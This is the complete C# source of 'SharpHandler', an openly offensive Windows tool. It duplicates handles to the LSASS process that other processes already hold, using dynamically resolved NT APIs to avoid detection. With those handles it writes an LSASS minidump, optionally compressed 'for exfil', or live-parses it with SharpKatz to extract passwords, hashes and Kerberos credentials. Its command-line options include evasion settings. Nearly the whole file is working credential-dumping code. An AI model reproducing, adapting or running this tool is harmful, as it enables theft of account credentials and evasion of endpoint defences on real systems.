using System;
using System.Collections.Generic;
using System.ComponentModel.Design;
using System.Diagnostics;
using System.Linq;
using System.Runtime.InteropServices;
using System.Security.Principal;
using System.Text;
using DInvoke.Data;
using NDesk.Options;
using SharpDump;
using SharpKatz;


namespace SharpHandler
{
    class Program
    {
        public static void PrintBanner()
        {
            Console.WriteLine(@"   _____ __                     __  __                ____         ");
            Console.WriteLine(@"  / ___// /_  ____ __________  / / / /___ _____  ____/ / /__  _____");
            Console.WriteLine(@"  \__ \/ __ \/ __ `/ ___/ __ \/ /_/ / __ `/ __ \/ __  / / _ \/ ___/");
            Console.WriteLine(@" ___/ / / / / /_/ / /  / /_/ / __  / /_/ / / / / /_/ / /  __/ /    ");
            Console.WriteLine(@"/____/_/ /_/\__,_/_/  / .___/_/ /_/\__,_/_/ /_/\__,_/_/\___/_/     ");
            Console.WriteLine(@"                     /_/                                           ");
            Console.WriteLine(@"");
            Console.WriteLine(@"Duplicating handles to dump LSASS since 2021, inspired by @Skelsec");
            Console.WriteLine("developed by @Jean_Maes_1994\n\n");
        }



        public static bool Is64Bits()
        {
            return Marshal.SizeOf(typeof(IntPtr)) == 8 ? true : false;
        }


        public static bool AmIAdmin()
        {
            bool admin = false;
            WindowsPrincipal windowsPrincipal = new WindowsPrincipal(WindowsIdentity.GetCurrent());
            admin = windowsPrincipal.IsInRole(WindowsBuiltInRole.Administrator);
            return admin;

        }

        public static void GetSeDebugPrivs()
        {
            bool previous = false;
            Object[] rtlAdjustPrivsParams = { 20, true, false, previous };
            Native.NTSTATUS status = (Native.NTSTATUS)DInvoke.DynamicInvoke.Generic.DynamicAPIInvoke("ntdll.dll", "RtlAdjustPrivilege", typeof(Delegates.RtlAdjustPrivilege), ref rtlAdjustPrivsParams);
            Console.WriteLine("[+] SeDebugPrivs obtained");
        }

        public static void ShowHelp(OptionSet p)
        {
            Console.WriteLine(" Usage:");
            p.WriteOptionDescriptions(Console.Out);
        }

        /// <summary>
        /// Retrieves all currently active handles for all system processes.
        /// There currently isn't a way to only get it for a specific process.
        /// This relies on NtQuerySystemInformation which exists in ntdll.dll.
        /// </summary>
        /// <returns>Unmanaged IntPtr to the handles (raw data, must be processed)</returns>
        private static IntPtr GetAllHandles()
        {
            int bufferSize = 0x10000;   //initial buffer size of 65536 bytes (initial estimate)
            int actualSize = 0;             //will store size of actual data written to buffer

            //initial allocation
            IntPtr pSysInfoBuffer = Marshal.AllocHGlobal(bufferSize);
            Object[] funcparams = { Structs.SYSTEM_INFORMATION_CLASS.SystemHandleInformation, pSysInfoBuffer, bufferSize, actualSize };
            Native.NTSTATUS queryResult = (Native.NTSTATUS)DInvoke.DynamicInvoke.Generic.DynamicAPIInvoke("ntdll.dll", "NtQuerySystemInformation", typeof(Delegates.NtQuerySystemInformation), ref funcparams);
            actualSize = (int)funcparams[3];
            // Keep calling until buffer is large enough to fit all handles
            while (queryResult == Native.NTSTATUS.InfoLengthMismatch)
            {
                //deallocate space since we couldn't fit all the handles in
                Marshal.FreeHGlobal(pSysInfoBuffer);

                //double buffer size (we can't just use actualSize from last call since # of handles vary in time)
                bufferSize = bufferSize * 2;

                //allocate memory with increase buffer size
                pSysInfoBuffer = Marshal.AllocHGlobal(bufferSize);

                //have to redefine here or program crashes, the joy of dynamic invocation :D 
                Object[] funcparams2 = { Structs.SYSTEM_INFORMATION_CLASS.SystemHandleInformation, pSysInfoBuffer, bufferSize, actualSize };
                //query for handles
                queryResult = (Native.NTSTATUS)DInvoke.DynamicInvoke.Generic.DynamicAPIInvoke("ntdll.dll", "NtQuerySystemInformation", typeof(Delegates.NtQuerySystemInformation), ref funcparams2);
                actualSize = (int)funcparams[3];
            }

            if (queryResult == Native.NTSTATUS.Success)
            {
                return pSysInfoBuffer; //pSystInfoBuffer will be freed later
            }
            else
            {
                //other NTSTATUS, shouldn't happen
                Marshal.FreeHGlobal(pSysInfoBuffer);
                return IntPtr.Zero;
            }
        }


        /// <summary>
        /// Filter out handles which belong to targetProcess.
        /// </summary>
        /// <param name="targetProcess">The process whose handles you want.</param>
        /// <param name="pAllHandles">Pointer to all the system handles.</param>
        /// <returns>List of handles owned by the targetProcess</returns>
        public static List<Structs.SYSTEM_HANDLE_INFORMATION> GetHandles(IntPtr pSysHandles, bool skip)
        {
            List<Structs.SYSTEM_HANDLE_INFORMATION> processHandles = new List<Structs.SYSTEM_HANDLE_INFORMATION>();

            Int64 pBaseLocation = pSysHandles.ToInt64();    //base address
            Int64 currentOffset;                            //offset from pBaseLocation
            IntPtr pLocation;                               //current address
            int pidLsass = Process.GetProcessesByName("lsass")[0].Id;

            Structs.SYSTEM_HANDLE_INFORMATION currentHandleInfo;

            //number of total system handles (should be okay for 64bit version too)
            int nHandles = Marshal.ReadInt32(pSysHandles);

            // Iterate through all system handles
            for (int i = 0; i < nHandles; i++)
            {
                //first (IntPtr.Size) bytes stores number of handles
                //data follows, each set is size of SYSTEM_HANDLE_INFORMATION
                currentOffset = IntPtr.Size + i * Marshal.SizeOf(typeof(Structs.SYSTEM_HANDLE_INFORMATION));

                //calculate intptr to new location
                pLocation = new IntPtr(pBaseLocation + currentOffset);

                // Create structure out of the memory block
                currentHandleInfo = (Structs.SYSTEM_HANDLE_INFORMATION)
                    Marshal.PtrToStructure(pLocation, typeof(Structs.SYSTEM_HANDLE_INFORMATION));

                // Add only handles that are not owned by SYSTEM nor by our current process.
                if (skip)
                {

                    if (currentHandleInfo.OwnerPID != 4 && currentHandleInfo.OwnerPID != Process.GetCurrentProcess().Id && currentHandleInfo.OwnerPID != pidLsass)
                    {
                        processHandles.Add(currentHandleInfo);
                    }
                }
                else
                {
                    if (currentHandleInfo.OwnerPID != 4 && currentHandleInfo.OwnerPID != Process.GetCurrentProcess().Id)
                    {
                        processHandles.Add(currentHandleInfo);
                    }
                }

            }

            //told you we'd free it later didn't I? 
            Marshal.FreeHGlobal(pSysHandles);
            return processHandles;
        }


        public static Dictionary<IntPtr, int> DupeAllHandles(List<Structs.SYSTEM_HANDLE_INFORMATION> handles)
        {

            // resolving lib addresses here so they don't need to be re-resolved every  time in the loop (saves a ton of execution time)
            IntPtr pOpenProc = DInvoke.DynamicInvoke.Generic.GetLibraryAddress("kernel32.dll", "OpenProcess");
            IntPtr pDuplicateHandle = DInvoke.DynamicInvoke.Generic.GetLibraryAddress("kernel32.dll", "DuplicateHandle");
            IntPtr pCloseHandle = DInvoke.DynamicInvoke.Generic.GetLibraryAddress("kernel32.dll", "CloseHandle");
            bool success = false;
            Dictionary<IntPtr, int> dupedHandlesAndTheirOriginalParent = new Dictionary<IntPtr, int>();
            IntPtr hCurrentProcess = Process.GetCurrentProcess().Handle;
            IntPtr dupedHandle = IntPtr.Zero;
            foreach (Structs.SYSTEM_HANDLE_INFORMATION handleinfo in handles)
            {
                Object[] openProcessParams = { Win32.Kernel32.ProcessAccessFlags.PROCESS_DUP_HANDLE, false, handleinfo.OwnerPID };
                IntPtr hParentProcess = (IntPtr)DInvoke.DynamicInvoke.Generic.DynamicFunctionInvoke(pOpenProc, typeof(DInvoke.DynamicInvoke.Win32.Delegates.OpenProcess), ref openProcessParams);
                if (hParentProcess != IntPtr.Zero)
                {
                    IntPtr sourceHandle = new IntPtr(handleinfo.HandleValue);
                    Object[] duplicateHandleParams = { hParentProcess, sourceHandle, hCurrentProcess, dupedHandle, (uint)0, false, Structs.DuplicateOptions.DUPLICATE_SAME_ACCESS };
                    success = (bool)DInvoke.DynamicInvoke.Generic.DynamicFunctionInvoke(pDuplicateHandle, typeof(Delegates.DuplicateHandle), ref duplicateHandleParams);
                    dupedHandle = (IntPtr)duplicateHandleParams[3];
                    if (success)
                    {
                        if (!dupedHandlesAndTheirOriginalParent.ContainsKey(dupedHandle))
                            dupedHandlesAndTheirOriginalParent.Add(dupedHandle, (int)handleinfo.OwnerPID);

                    }

                    Object[] closeHandleParams = { hParentProcess };
                    success = (bool)DInvoke.DynamicInvoke.Generic.DynamicFunctionInvoke(pCloseHandle, typeof(Delegates.CloseHandle), ref closeHandleParams);

                }
            }
            return dupedHandlesAndTheirOriginalParent;
        }

        public static Dictionary<IntPtr, int> GetLsassHandlesFromDupedHandles(Dictionary<IntPtr, int> dupedhandlesAndTheirParents)
        {
            Dictionary<IntPtr, int> lsassHandlesAndTheirParentPid = new Dictionary<IntPtr, int>();
            Native.NTSTATUS status;
            IntPtr pUnicodeString = IntPtr.Zero;
            IntPtr ipTemp = IntPtr.Zero;

            //again, resolving all needed libaddresses here to save a bunch of executiontime :) 
            IntPtr pNtQueryObject = DInvoke.DynamicInvoke.Generic.GetLibraryAddress("ntdll.dll", "NtQueryObject");
            IntPtr pCloseHandle = DInvoke.DynamicInvoke.Generic.GetLibraryAddress("kernel32.dll", "CloseHandle");
            IntPtr pQueryFullProcessImageNameA = DInvoke.DynamicInvoke.Generic.GetLibraryAddress("kernel32.dll", "QueryFullProcessImageNameA");

            foreach (KeyValuePair<IntPtr, int> dupedHandleAndParentPid in dupedhandlesAndTheirParents)
            {
                Structs.OBJECT_BASIC_INFORMATION objBasicInformation = new Structs.OBJECT_BASIC_INFORMATION();
                IntPtr pBasicInformation = Marshal.AllocHGlobal(Marshal.SizeOf(objBasicInformation));
                int iBasicInformationLength = 0;
                Object[] NtQueryParams = { dupedHandleAndParentPid.Key, Structs.OBJECT_INFORMATION_CLASS.ObjectBasicInformation, pBasicInformation, Marshal.SizeOf(objBasicInformation), iBasicInformationLength };
                status = (Native.NTSTATUS)DInvoke.DynamicInvoke.Generic.DynamicFunctionInvoke(pNtQueryObject, typeof(Delegates.NtQueryObject), ref NtQueryParams);
                iBasicInformationLength = (int)NtQueryParams[4];
                objBasicInformation = (Structs.OBJECT_BASIC_INFORMATION)Marshal.PtrToStructure(pBasicInformation, typeof(Structs.OBJECT_BASIC_INFORMATION));
                Marshal.FreeHGlobal(pBasicInformation);

                //can appearantly cause ntquery to hang so skipping these.
                if (objBasicInformation.GrantedAccess == 0x0012019F || objBasicInformation.GrantedAccess == 0x001A019F)
                {
                    Object[] closeHandleParams = { dupedHandleAndParentPid.Key };
                    bool closed = (bool)DInvoke.DynamicInvoke.Generic.DynamicFunctionInvoke(pCloseHandle, typeof(Delegates.CloseHandle), ref closeHandleParams);
                    continue;
                }

                int iObjectTypeInformationLength = (int)objBasicInformation.TypeInformationLength;
                IntPtr pObjectTypeInformation = Marshal.AllocHGlobal(iObjectTypeInformationLength);
                Object[] ntQueryObjectParams = { dupedHandleAndParentPid.Key, Structs.OBJECT_INFORMATION_CLASS.ObjectTypeInformation, pObjectTypeInformation, iObjectTypeInformationLength, iObjectTypeInformationLength };
                status = (Native.NTSTATUS)DInvoke.DynamicInvoke.Generic.DynamicFunctionInvoke(pNtQueryObject, typeof(Delegates.NtQueryObject), ref ntQueryObjectParams);
                iObjectTypeInformationLength = (int)ntQueryObjectParams[4];
                //initial buffer wasn't big enough, this should only happen once per process as ntQuery returns the actual length needed.
                if ((Native.NTSTATUS)DInvoke.DynamicInvoke.Generic.DynamicFunctionInvoke(pNtQueryObject, typeof(Delegates.NtQueryObject), ref ntQueryObjectParams) == Native.NTSTATUS.InfoLengthMismatch)
                {
                    Object[] ntQueryObjectParams2 = { dupedHandleAndParentPid.Key, Structs.OBJECT_INFORMATION_CLASS.ObjectTypeInformation, pObjectTypeInformation, iObjectTypeInformationLength, iObjectTypeInformationLength };
                    status = (Native.NTSTATUS)DInvoke.DynamicInvoke.Generic.DynamicFunctionInvoke(pNtQueryObject, typeof(Delegates.NtQueryObject), ref ntQueryObjectParams2);
                    if ((status != Native.NTSTATUS.Success))
                    {
                        Console.Error.WriteLine("ERROR");
                        throw new Exception("an unknown error occured, please try to increase the size of iObjecttypeinformationlength manually.");

                    }
                }

                Structs.OBJECT_TYPE_INFORMATION objectType = (Structs.OBJECT_TYPE_INFORMATION)Marshal.PtrToStructure(pObjectTypeInformation, typeof(Structs.OBJECT_TYPE_INFORMATION));
                Marshal.FreeHGlobal(pObjectTypeInformation);
                ipTemp = objectType.Name.Buffer;
                // Console.WriteLine(ipTemp);
                if (ipTemp != IntPtr.Zero)
                {
                    String strObjectTypeName = Marshal.PtrToStringUni(ipTemp, objectType.Name.Length >> 1);
                    // Console.WriteLine(strObjectTypeName);
                    //we can close any handle that isnt a processhandle as they dont interest us.
                    if (strObjectTypeName != "Process")
                    {
                        Object[] closeHandleParams = { dupedHandleAndParentPid.Key };
                        bool closed = (bool)DInvoke.DynamicInvoke.Generic.DynamicFunctionInvoke(pCloseHandle, typeof(Delegates.CloseHandle), ref closeHandleParams);
                    }
                    else
                    {
                        //parse the processHandle looking for lsass
                        String processName = "";
                        StringBuilder buffer = new StringBuilder(1024);
                        int size = buffer.Capacity;
                        Object[] queryFullProcessImageNameParams = { dupedHandleAndParentPid.Key, 0, buffer, size };
                        size = (int)queryFullProcessImageNameParams[3];
                        bool success = (bool)DInvoke.DynamicInvoke.Generic.DynamicFunctionInvoke(pQueryFullProcessImageNameA, typeof(Delegates.QueryFullProcessImageName), ref queryFullProcessImageNameParams);
                        processName = buffer.ToString();
                        //Console.Write(processName);
                        if (processName != "C:\\Windows\\System32\\lsass.exe")
                        {
                            Object[] closeHandleParams = { dupedHandleAndParentPid.Key };
                            bool closed = (bool)DInvoke.DynamicInvoke.Generic.DynamicFunctionInvoke(pCloseHandle, typeof(Delegates.CloseHandle), ref closeHandleParams);
                        }
                        else
                        {
                            lsassHandlesAndTheirParentPid.Add(dupedHandleAndParentPid.Key, dupedHandleAndParentPid.Value);
                        }

                    }

                }
                else
                {
                    Object[] closeHandleParams = { dupedHandleAndParentPid.Key };
                    bool closed = (bool)DInvoke.DynamicInvoke.Generic.DynamicFunctionInvoke(pCloseHandle, typeof(Delegates.CloseHandle), ref closeHandleParams);
                }
            }

            //return typeHandles;
            return lsassHandlesAndTheirParentPid;

        }

        public static IntPtr ChooseRandomLsassHandle(Dictionary<IntPtr, int> lsassHandlesAndTheirParentPid)
        {
            IntPtr lsassHandle = IntPtr.Zero;
            Random rnd = new Random();
            int index = rnd.Next(lsassHandlesAndTheirParentPid.Count);
            lsassHandle = lsassHandlesAndTheirParentPid.ElementAt(index).Key;
            int parentProcessID = lsassHandlesAndTheirParentPid.ElementAt(index).Value;
            String parentProcessName = Process.GetProcessById(parentProcessID).ProcessName;
            Console.WriteLine("chosen to use the handle 0x{0}, duped from {1} to dump. \n", string.Format("{0:X}", lsassHandle.ToInt64()), parentProcessName);
            return lsassHandle;
        }

        public static void GetLiveCreds(IntPtr lsassHandle)
        {

            if (IntPtr.Size != 8)
            {
                Console.WriteLine("Windows 32bit not supported");
                Environment.Exit(-1);
            }

            OSVersionHelper osHelper = new OSVersionHelper();
            osHelper.PrintOSVersion();

            if (osHelper.build <= 9600)
            {
                Console.WriteLine("Unsupported OS Version");
                return;
            }

            IntPtr lsasrv = IntPtr.Zero;
            IntPtr wdigest = IntPtr.Zero;
            IntPtr lsassmsv1 = IntPtr.Zero;
            IntPtr kerberos = IntPtr.Zero;
            IntPtr tspkg = IntPtr.Zero;
            IntPtr lsasslive = IntPtr.Zero;
            IntPtr hProcess = lsassHandle;
            Process plsass = Process.GetProcessesByName("lsass")[0];
            ProcessModuleCollection processModules = plsass.Modules;
            int modulefound = 0;

            for (int i = 0; i < processModules.Count && modulefound < 5; i++)
            {
                string lower = processModules[i].ModuleName.ToLowerInvariant();

                if (lower.Contains("lsasrv.dll"))
                {
                    lsasrv = processModules[i].BaseAddress;
                    modulefound++;
                }
                else if (lower.Contains("wdigest.dll"))
                {
                    wdigest = processModules[i].BaseAddress;
                    modulefound++;
                }
                else if (lower.Contains("msv1_0.dll"))
                {
                    lsassmsv1 = processModules[i].BaseAddress;
                    modulefound++;
                }
                else if (lower.Contains("kerberos.dll"))
                {
                    kerberos = processModules[i].BaseAddress;
                    modulefound++;
                }
                else if (lower.Contains("tspkg.dll"))
                {
                    tspkg = processModules[i].BaseAddress;
                    modulefound++;
                }
            }

            Keys keys = new Keys(hProcess, lsasrv, osHelper);
            List<SharpKatz.Credential.Logon> logonlist = new List<SharpKatz.Credential.Logon>();
            SharpKatz.Module.LogonSessions.FindCredentials(hProcess, lsasrv, osHelper, keys.GetIV(), keys.GetAESKey(), keys.GetDESKey(), logonlist);
            SharpKatz.Module.Msv1.FindCredentials(hProcess, osHelper, keys.GetIV(), keys.GetAESKey(), keys.GetDESKey(), logonlist);
            SharpKatz.Module.CredMan.FindCredentials(hProcess, osHelper, keys.GetIV(), keys.GetAESKey(), keys.GetDESKey(), logonlist);
            SharpKatz.Module.Tspkg.FindCredentials(hProcess, tspkg, osHelper, keys.GetIV(), keys.GetAESKey(), keys.GetDESKey(), logonlist);
            List<SharpKatz.Module.Kerberos.KerberosLogonItem> klogonlist = SharpKatz.Module.Kerberos.FindCredentials(hProcess, kerberos, osHelper, keys.GetIV(), keys.GetAESKey(), keys.GetDESKey(), logonlist);
            foreach (SharpKatz.Module.Kerberos.KerberosLogonItem l in klogonlist)
                SharpKatz.Module.Kerberos.GetCredentials(ref hProcess, l.LogonSessionBytes, osHelper, keys.GetIV(), keys.GetAESKey(), keys.GetDESKey(), logonlist);
            SharpKatz.Module.WDigest.FindCredentials(hProcess, wdigest, osHelper, keys.GetIV(), keys.GetAESKey(), keys.GetDESKey(), logonlist);
            Utility.PrintLogonList(logonlist);
        }


        static void Main(string[] args)
        {
            bool scan = false;
            bool skip = false;
            bool help = false;
            bool writedump = false;
            bool interactive = false;
            bool liveparse = false;
            bool compress = false;
            string parentToDupe = "";
            string dumplocation = "";

            var options = new OptionSet()
            {
                {"h|?|help", "Show Help\n\n", o => help = true},
                {"s|scan","Checks if there are dupeable handles to use",o => scan = true },
                {"skip-lsass","don't reuse lsass handles (useful for evasion, but you lose these open handles of course)",o => skip = true},
                {"p|process=","the process that you want to use to interact with lsass (has to have a handle to lsass)", o=>parentToDupe =o },
                {"w|write","Writes a minidump to location specified with -l thx to sharpdump", o => writedump = true  },
                {"c|compress","compressess the minidump and deletes the normal dump from disk (gzip format)",o => compress = true },
                {"l|location=","the location to write the minidumpfile to", o=>dumplocation = o },
                {"i|interactive","interactive mode (this mode cannot be used with execute-assembly)",o=>interactive = true },
                {"d|dump|logonpasswords","uses sharpkatz (only supports x64 architecture) functionality to live parse lsass (equivalent of logonpasswords)", o=>liveparse=true }
            };

            try
            {
                AmIAdmin();
                if (!Is64Bits())
                {
                    throw new Exception("only 64 bit is supported. (for now)");

                }

                PrintBanner();
                options.Parse(args);

                if (help)
                {
                    ShowHelp(options);
                }


                if (scan || interactive || writedump || liveparse)
                {
                    GetSeDebugPrivs();
                    IntPtr allHandles = GetAllHandles();
                    if (interactive)
                    {
                        Console.WriteLine("Do you want to include lsass itself in the handle reuse options? (less opsec safe, but insures a reuseable handle) [y/n]");
                        if (Console.ReadKey().Key == ConsoleKey.Y)
                        {
                            skip = false;

                        }
                        else
                        {
                            skip = true;
                        }
                        //readkey doesnt put a new line, making output ugly as hell
                        Console.WriteLine();
                    }
                    List<Structs.SYSTEM_HANDLE_INFORMATION> allHandleInformation = GetHandles(allHandles, skip);
                    Dictionary<IntPtr, int> dupedHandlesAndTheirParents = DupeAllHandles(allHandleInformation);
                    Console.WriteLine("Done duping all dupeable handles");
                    Console.WriteLine("Looking for that juicy LSASS handle dupe, closing all other handles...");
                    Dictionary<IntPtr, int> lsassHandlesAndTheirParents = GetLsassHandlesFromDupedHandles(dupedHandlesAndTheirParents);
                    if (lsassHandlesAndTheirParents.Count == 0)
                    {
                        Console.WriteLine("no lsass handles found to dupe.. :(");
                        Environment.Exit(0);

                    }
                    else
                    {
                        Console.ForegroundColor = ConsoleColor.DarkGreen;
                        Console.WriteLine("{0} LSASS handles duped: \n", lsassHandlesAndTheirParents.Count);
                        IntPtr lsassHandle = IntPtr.Zero;
                        foreach (KeyValuePair<IntPtr, int> handleEntry in lsassHandlesAndTheirParents)
                        {
                            Process originalProcess = Process.GetProcessById(handleEntry.Value);
                            String originalProcessName = originalProcess.ProcessName;
                            Console.WriteLine("new LSASS handle 0x{0} obtained! duped from original process: {1}", string.Format("{0:X}", handleEntry.Key.ToInt64()), originalProcessName);

                            if (!string.IsNullOrEmpty(parentToDupe))
                            {
                                if (originalProcessName == parentToDupe)
                                {
                                    lsassHandle = handleEntry.Key;

                                }

                            }
                        }
                        Console.ResetColor();
                        if (interactive || liveparse || writedump)
                        {
                            if (!string.IsNullOrEmpty(parentToDupe) && lsassHandle == IntPtr.Zero)
                            {
                                throw new ArgumentException(parentToDupe + " does not seem to have any open handles to LSASS");
                            }

                            if (!interactive)
                            {
                                Console.WriteLine("using handle of {0} to dump", parentToDupe);
                            }

                            if (interactive)
                            {
                                int index = 0;
                                Console.WriteLine("Do you want to select a parent to dupe the handle from? [y/n]");

                                if (Console.ReadKey().Key == ConsoleKey.Y)
                                {
                                    Console.WriteLine("\nPlease make your selection: (press enter to confirm selection) \n");
                                    foreach (KeyValuePair<IntPtr, int> handleEntry in lsassHandlesAndTheirParents)
                                    {
                                        Process originalProcess = Process.GetProcessById(handleEntry.Value);
                                        String originalProcessName = originalProcess.ProcessName;
                                        Console.WriteLine("[{0}]: Use handle from parent process {1}", index, originalProcessName);
                                        index++;
                                    }
                                    //add a "choose random process" option
                                    int randomProcess = index;
                                    Console.WriteLine("[{0}]: Choose random option", randomProcess);
                                    string selection = Console.ReadLine();
                                    int iselection = int.Parse(selection);
                                    if (iselection < index)
                                    {
                                        lsassHandle = lsassHandlesAndTheirParents.ElementAt(iselection).Key;
                                        Console.ForegroundColor = ConsoleColor.Green;
                                        Console.WriteLine("Chosen {0} as parentprocess", Process.GetProcessById(lsassHandlesAndTheirParents.ElementAt(iselection).Value).ProcessName);
                                        Console.ResetColor();
                                    }
                                    else if (iselection == index)
                                    {
                                        ChooseRandomLsassHandle(lsassHandlesAndTheirParents);
                                    }
                                    else
                                    {
                                        throw new ArgumentException(selection + " is not a valid option!");
                                    }
                                }
                                else
                                {
                                    Console.WriteLine();
                                    lsassHandle = ChooseRandomLsassHandle(lsassHandlesAndTheirParents);
                                }

                                Console.WriteLine("\nDo you want to write a dumpfile or do a liveparse? (press enter to confirm selection)");
                                Console.WriteLine("1. Write a dumpfile");
                                Console.WriteLine("2. Liveparse");
                                string selection2 = Console.ReadLine();
                                int iselection2 = int.Parse(selection2);
                                if (iselection2 == 1)
                                {
                                    Console.WriteLine("\nWhere do you want to store the dumpfile? give a full path (ex. c:\\temp\\mydump.dump) press enter to confirm");
                                    dumplocation = Console.ReadLine();
                                    Console.WriteLine("\nDo you want to compress the dump to a gzip file to reduce size for exfil? (y/n)");
                                    if (Console.ReadKey().Key == ConsoleKey.Y)
                                    {
                                        compress = true;
                                    }
                                    Console.WriteLine();
                                    Dumper.Minidump(lsassHandle, dumplocation, compress);
                                }

                                else if (iselection2 == 2)
                                {
                                    GetLiveCreds(lsassHandle);
                                }
                                else
                                {
                                    throw new ArgumentException("\n" + selection2 + " is not a valid selection!");
                                }

                            }
                            else
                            {
                                if (lsassHandle == IntPtr.Zero)
                                    lsassHandle = ChooseRandomLsassHandle(lsassHandlesAndTheirParents);
                            }

                            if (liveparse)
                            {
                                GetLiveCreds(lsassHandle);
                            }

                            if (writedump)
                            {
                                if (string.IsNullOrEmpty(dumplocation))
                                    throw new ArgumentException("a location to write the dumpfile to is required!");
                                Dumper.Minidump(lsassHandle, dumplocation, compress);
                            }
                        }
                    }
                }
                else if (args.Length == 0)
                {
                    PrintBanner();
                    ShowHelp(options);
                }
            }
            catch (Exception e)
            {
                Console.Error.WriteLine(e.Message);
                PrintBanner();
                ShowHelp(options);
            }

        }
    }
}
